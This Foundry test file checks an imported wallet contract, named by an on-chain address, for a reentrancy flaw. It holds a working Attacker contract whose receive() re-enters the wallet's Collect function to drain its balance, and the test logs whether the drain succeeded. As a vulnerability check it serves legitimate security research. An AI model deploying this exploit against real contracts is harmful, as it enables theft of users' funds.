// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol";

contract ReentrancyTest is Test {
    Log public logger;  // Renamed to avoid conflict with built-in 'log'
    X_WALLET public wallet;
    Attacker public attacker;
    
    function setUp() public {
        logger = new Log();
        wallet = new X_WALLET(address(logger));
    }

    function testReentrancyVulnerability() public {
        attacker = new Attacker(wallet);
        
        // Fund attacker contract with 2 ETH
        uint depositAmount = 2 ether;
        vm.deal(address(attacker), depositAmount);

        // Deposit funds (lock for 1 day)
        uint unlockTime = block.timestamp + 1 days;
        vm.prank(address(attacker));
        wallet.Put{value: depositAmount}(unlockTime);
        
        // Advance time past lock period
        vm.warp(unlockTime + 1);
        
        // Verify wallet has funds
        assertEq(address(wallet).balance, depositAmount, "Initial balance incorrect");
        
        // Differential validation
        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 walletBalanceBefore = address(wallet).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console2.log("Wallet ETH before attack:", walletBalanceBefore);
        console2.log("Attacker ETH before attack:", attackerBalanceBefore);
        
        console2.log("--- Trigger Attack ---");
        // Execute attack - 2 reentrant withdrawals of 1 ETH each
        attacker.startAttack(1 ether);
        
        console2.log("--- AFTER-Trigger Attack ---");
        uint256 walletBalanceAfter = address(wallet).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console2.log("Wallet ETH after attack:", walletBalanceAfter);
        console2.log("Attacker ETH after attack:", attackerBalanceAfter);
        
        // Vulnerability verification logic
        bool drained = (attackerBalanceAfter > attackerBalanceBefore) && 
                        (walletBalanceAfter < walletBalanceBefore);
        
        bool attackSuccess = walletBalanceAfter == 0 && 
                             attackerBalanceAfter == depositAmount;
        
        console2.log("Funds movement detected:", drained ? "YES" : "NO");
        console2.log("Wallet fully drained:", attackSuccess ? "YES" : "NO");
        
        if (attackSuccess) {
            console2.log("Vulnerability Exists: Attacker successfully drained wallet via reentrancy");
        } else {
            console2.log("Vulnerability not Exist: Reentrancy attack failed");
        }
    }
}

contract Attacker {
    X_WALLET public wallet;
    uint public attackAmount;
    uint public count;

    constructor(X_WALLET _wallet) {
        wallet = _wallet;
    }

    function startAttack(uint amount) public {
        attackAmount = amount;
        wallet.Collect(attackAmount);
    }

    receive() external payable {
        if (count < 1 && address(wallet).balance >= attackAmount) {
            count++;
            wallet.Collect(attackAmount);
        }
    }
}